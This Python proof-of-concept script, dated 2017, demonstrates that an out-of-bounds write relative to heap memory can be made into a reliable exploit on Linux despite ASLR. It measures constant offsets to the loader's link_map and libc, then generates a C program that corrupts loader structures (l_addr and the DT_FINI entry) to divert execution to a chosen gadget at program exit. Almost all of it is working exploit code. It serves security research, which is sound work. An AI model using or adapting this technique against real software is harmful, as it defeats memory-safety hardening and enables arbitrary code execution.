#!/usr/bin/env python3

## Ugly script to demonstrate that it is possible to create a reliable exploit
## from write-anything-relative-to-aslr'd-data-structure vulnerabilities (i.e.
## unbounded array accesses) using only hardcoded constants on Linux even
## if ASLR is turned on.
## PoC by Julian Kirsch (kirschju) November 2017

import os, re, sys, struct, tempfile, subprocess

##############################################################################
######################### Exploit configuration area #########################
##############################################################################

## ALLOC_SIZE Allocation size to use to get a pointer with constant distance
##            to libc/ld (default: 0x21000).
ALLOC_SIZE = 0x21000

## ALLOC_FUNC Function to use to allocate ALLOC_SIZE bytes at constant distance
##            to libc/ld (default: malloc)
## FREE_FUNC  Function to use to free the previously allocated memory
##            (default: free)
## Other interesting combination is ("alloca", "") together with safe stack in
## C_FLAGS. Try decreasing ALLOC_SIZE or increasing ulimit -s in case you
## observe crashes due to stack overflows introduced by alloca.
ALLOC_FUNC, FREE_FUNC = ("malloc", "free")
#ALLOC_FUNC, FREE_FUNC = ("alloca", "")

## C_COMPILER Compiler to use. Most likely gcc or clang
C_COMPILER = "gcc"

## C_FLAGS Flags to use during compilation. Interesting variant is
##         -fsanitize=safe-stack when using clang together with stack based
##         allocation (alloca) above
C_FLAGS = "-pie -fno-plt -fPIC -fstack-protector-all -Wl,-z,relro,-z,now -D_FORTIFY_SOURCE=2 -O2"

## CALL_BASE Specify as "elf" for CALL_TARGET to be relative to beginning of
##           main ELF. Anything else means CALL_TARGET is relative to beginning
##           of libc (if ASLR determinism allows)
CALL_BASE = "libc"

## CALL_TARGET Virtual address inside of glibc that the exploit should call
##             If set to None, the exploit will simply call __libc_main
CALL_TARGET = None
#CALL_TARGET = 0xd694f ## win gadget for Debian Buster (glibc 2.24-17)

# ------------------- DON'T TOUCH ANYTHING BELOW THIS LINE ------------------- #

exc = lambda cmd: subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE)
u64 = lambda x: struct.unpack("<Q", x)[0]

magic = ""

if exc("uname -m").stdout.read().decode().strip() != "x86_64":
    print("// [-] This script is tweaked to run on amd64 Linux only")
    sys.exit(-1)

## Step 1: Find absolute path of ld on this system
p = exc("cat /proc/self/maps | grep ld | head -n1")
out = p.stdout.read().decode().strip()
ldpath = out[out.find('/'):]
print("// [+] ld is {}".format(ldpath))

## Step 2: Find _rtld_global and _r_debug in ld
p = exc("nm -D {} | grep -w _rtld_global".format(ldpath))
rtld_global = int(p.stdout.read().decode().strip().split(" ")[0], 16)
print("// [+] _rtld_global is at offset 0x{:x}".format(rtld_global))
p = exc("nm -D {} | grep -w _r_debug".format(ldpath))
r_debug = int(p.stdout.read().decode().strip().split(" ")[0], 16)
print("// [+] _r_debug is at offset 0x{:x}".format(r_debug))

## Step 3: Use _rtld_global to measure offset of mmap'd chunk and struct link_map
tmp_file, tmp_path = tempfile.mkstemp(".c")  ## source
cmp_file, cmp_path = tempfile.mkstemp()      ## compiled measurement binary
open(tmp_path, "w").write("""
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stddef.h>
#include <sys/auxv.h>
#include <alloca.h>

int main(int argc, char **argv)
{{
    void *ptr = NULL;

    void *libc_base = (void *)((unsigned long)__builtin_return_address(0) & ~0xfffUL);
    while (*(unsigned int *)libc_base != 0x464c457f) libc_base -= 0x1000;

    void *ld_base   = (void *)getauxval(AT_BASE);
    void *link_map  = *(void **)(ld_base + 0x{:x});

    ptr = {}(0x{:x});
    printf("%lx %lx\\n", (ptrdiff_t)(link_map - ptr), (ptrdiff_t)(ld_base - libc_base));
    {}(ptr);
}}

        """.format(rtld_global, ALLOC_FUNC, ALLOC_SIZE, FREE_FUNC))
os.close(tmp_file)
os.close(cmp_file)

subprocess.check_call("{} {} {} -o {}".format(C_COMPILER, C_FLAGS, tmp_path, cmp_path), shell = True)
probes = []

## Execute the measurement helper and check for the ASLR weakness
for _ in range(8):
    p = subprocess.Popen(cmp_path, shell = True, stdout = subprocess.PIPE)
    out = p.stdout.read().decode().strip().split(" ")
    probes.append(tuple(map(lambda x: int(x, 16), out)))

score = 0

if len(set(p[0] for p in probes)) == 1:
    score += 1
    print("// [+] Constant distance of array to struct link_map is 0x{:x}".format(probes[0][0]))
else:
    print("// [-] No ASLR weakness found for given parameters.")
    print("// [-] No hack today :(")
    sys.exit(-2)

## If distance of ld to libc is not constant, we can still recover and call
## a function contained in the main ELF
if len(set(p[1] for p in probes)) == 1:
    score += 1
    print("// [+] Constant distance of libc to ld is 0x{:x}".format(probes[0][1]))

if score == 0:
    print("// [-] No ASLR weakness found for given parameters.")
    print("// [-] No hack today :(")
    sys.exit(-2)

if score == 1 or CALL_BASE == "elf":
    print("// [ ] Will create example calling a function in the binary.")
    magic = """\nvoid magic(void) {
    puts("The magic function was called. Strange, I'm not a destructor, huh?");
}\n"""

link_map, libc_ld_diff = probes[0]

os.remove(tmp_path)
os.remove(cmp_path)

## Step 4: Find .dynamic section in the final binary and locate 
##         FINI, FINI_ARRAYSZ, DEBUG and some value < 8 (0x0d and 0x1b)

tmp_file, tmp_path = tempfile.mkstemp(".c")
cmp_file, cmp_path = tempfile.mkstemp()

open(tmp_path, "w").write("""
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <alloca.h>
#include <sys/auxv.h>
{}
int main(int argc, char **argv)
{{
    unsigned char *ptr;
    ptr = {}({:#x});
    printf("%p\\n", ptr);

    *(unsigned long long *)&ptr[{:#x}] = 0x0011223344556677; // Dummy value for now

    ptr[{:#x} +  0xa8] = 0x13; // Dummy value for now
    ptr[{:#x} + 0x120] = 0x37; // Dummy value for now

    return 0;
}}""".format(magic, ALLOC_FUNC, ALLOC_SIZE, link_map, link_map, link_map))
os.close(tmp_file)
os.close(cmp_file)

subprocess.check_call("{} {} {} -o {}".format(C_COMPILER, C_FLAGS, tmp_path, cmp_path), shell = True)

p = exc("readelf -d {} | grep Dynamic".format(cmp_path))
out = p.stdout.read().decode().strip()
m = re.match(r"Dynamic section at offset 0x([0-9a-f]+) contains (\d+) en.*", out)
dyn_sec = int(m.group(1), 16)
dyn_len = int(m.group(2), 10) * 0x10

print("// [+] .dynamic Section @ {:#x} ({} entries)".format(dyn_sec, dyn_len >> 4))

dyn = open(cmp_path, 'rb').read()[dyn_sec:][:dyn_len]
dyn = struct.unpack("<{}Q".format(dyn_len // 8), dyn)

fini, fini_arraysz, debug, strtab, small = None, None, None, None, None
for i in range(0, len(dyn), 2):
    if dyn[i] == 0x0d: ## FINI
        fini = i * 8 + dyn_sec
    elif dyn[i] == 0x1c: ## FINI_ARRAYSZ
        fini_arraysz = i * 8 + dyn_sec
    elif dyn[i] == 0x15: ## DEBUG
        debug = i * 8 + dyn_sec
    elif dyn[i] == 0x05: ## STRTAB (needed for call targets in main ELF only)
        strtab = i * 8 + dyn_sec

if not all([fini, fini_arraysz, debug]):
    print("// [-] Failed to find needed entries within ELF .dynamic section")
    print("// [-] No hack today :(")
    sys.exit(-3)

twobyte = False
if CALL_BASE == "elf":
    if not (fini >> 8 == fini_arraysz >> 8 == strtab >> 8):
        print("// [-] 0x100 byte boundary separating FINI, FINI_ARRAYSZ and STRTAB")
        print("// [-] Will construct probabilistic exploit with success rate of 1:16")
        twobyte = True
else:
    if not (fini >> 8 == fini_arraysz >> 8 == debug >> 8):
        print("// [-] 0x100 byte boundary separating FINI, FINI_ARRAYSZ and DEBUG")
        print("// [-] Will construct probabilistic exploit with success rate of 1:16")
        twobyte = True

## Now determine a small entry in the .dynamic section that can be reached by a
## one-byte-override
window = open(cmp_path, 'rb').read()[fini_arraysz & ~0xff:][:0x100]
window = struct.unpack("<32Q", window)

for i in range((dyn_sec & 0xf) // 8, len(window), 2):
    if window[i] < 8:
        small = i * 8 + (fini_arraysz & ~0xff)

if small is None:
    print("// [-] .dynamic Section does not contain a small entry")
    print("// [-] No hack today :(")
    sys.exit(-5)

small -= 8 ## Account for (key, value) dict style and make small point to key

print("// [+] FINI: {:#x} FINI_ARRAYSZ: {:#x} DEBUG: {:#x} SMALL: {:#x}".format(
    fini, fini_arraysz, debug, small))


## Find the magic function in the binary
if score == 1 or CALL_BASE == "elf":
    p = exc("readelf -l {} | grep -A1 LOAD | grep -B1 'E ' | " \
            " head -n 1 | cut -d'x' -f3 | cut -d' ' -f1".format(cmp_path))
    elf_base = int(p.stdout.read().decode().strip().split(" ")[0], 16)

    if CALL_TARGET is not None:
        magic_offset = CALL_TARGET
    else:
        if strtab is None:
            print("// [-] Binary has no strtab.")
            print("// [-] This error is probably recoverable, but not implemented.")
            print("// [-] No hack today :(")
            sys.exit(-6)
        print("// [+] STRTAB: {:#x}".format(strtab))
        p = exc("nm {} | grep -w magic | cut -d' ' -f1".format(cmp_path))
        magic_addr = int(p.stdout.read().decode().strip().split(" ")[0], 16)
        magic_offset = magic_addr - elf_base
        CALL_TARGET = magic_offset

    p = exc("readelf -d {} | grep -w STRTAB | cut -d' ' -f4-".format(cmp_path))
    strtab_addr = int(p.stdout.read().decode().strip().split(" ")[0], 16)
    p = exc("readelf -s {} | grep -w _fini | cut -d':' -f2".format(cmp_path))
    fini_addr = int(p.stdout.read().decode().strip().split(" ")[0], 16)

    strtab_offset = strtab_addr - elf_base
    fini_offset = fini_addr - elf_base

    print("// [+] Offset of strtab relative to base: {:#x}".format(strtab_offset))
    print("// [+] Offset of magic relative to base: {:#x}".format(magic_offset))
    print("// [+] Offset of _fini relative to base: {:#x}".format(fini_offset))

if CALL_TARGET is None and CALL_TARGET != "elf":
    print("// [+] CALL_TARGET not set. Will construct exploit targeting __libc_main")
    p = exc("cat /proc/self/maps | grep libc | head -n1")
    out = p.stdout.read().decode().strip()
    libcpath = out[out.find('/'):]
    p = exc("readelf -h {} | grep Entry | cut -d':' -f2".format(libcpath))
    CALL_TARGET = int(p.stdout.read().decode().strip().split(" ")[0], 16)


os.remove(tmp_path)
os.remove(cmp_path)

print("// [+] Finished. Compile the following using")
print("//     {} {}".format(C_COMPILER, C_FLAGS))

## Step 5: Print final C program that executes the target function CALL_TARGET
##         by corrupting internal loader data structures, if score was 2.
##         Otherwise, insert the magic function into the main ELF and call it.

if score == 2 and CALL_BASE != "elf":
    print("""
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <alloca.h>
#include <sys/auxv.h>
{}
int main(int argc, char **argv)
{{
    unsigned char *ptr;
    ptr = {}({:#x});
    printf("%p\\n", ptr);""".format(magic, ALLOC_FUNC, ALLOC_SIZE))
    
    ## Override l->l_addr with the (constant) distance of debug and target
    print("""
    *(unsigned long long *)&ptr[{:#x}] = {:#x};""".format(link_map,
        (-r_debug - libc_ld_diff + CALL_TARGET) & 0xffffffffffffffff))
    
    ## Override l->l_info[DT_FINI] with a pointer to r_debug in ld.so
    print("""
    ptr[{:#x} +  0xa8] = {:#x};""".format(link_map, debug & 0xff), end = "")
    if twobyte:
        print("""
    ptr[{:#x} +  0xa9] = {:#x};""".format(link_map, ((debug >> 8) & 0xf) + 0x40), end = "")

    print("""
    ptr[{:#x} + 0x120] = {:#x};""".format(link_map, small & 0xff))
    print("")
    
    print("""    return 0;
}""")
else:
    print("""
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <alloca.h>
#include <sys/auxv.h>
{}
int main(int argc, char **argv)
{{
    unsigned char *ptr;
    ptr = {}({:#x});
    printf("%p\\n", ptr);""".format(magic, ALLOC_FUNC, ALLOC_SIZE))
    
    ## Override l->l_addr with the (constant) distance of debug and target
    print("""
    *(unsigned long long *)&ptr[{:#x}] = {:#x};""".format(link_map,
        (-strtab_offset + magic_offset) & 0xffffffffffffffff))
    
    ## Override l->l_info[DT_FINI] with a pointer to r_debug in ld.so
    print("""
    ptr[{:#x} +  0xa8] = {:#x};""".format(link_map, strtab & 0xff), end = "")
    if twobyte:
        print("""
    ptr[{:#x} +  0xa9] = {:#x};""".format(link_map, ((strtab >> 8) & 0xf) + 0x40), end = "")
    print("""
    ptr[{:#x} + 0x120] = {:#x};""".format(link_map, small & 0xff))
    print("")
    
    print("""    return 0;
}""")
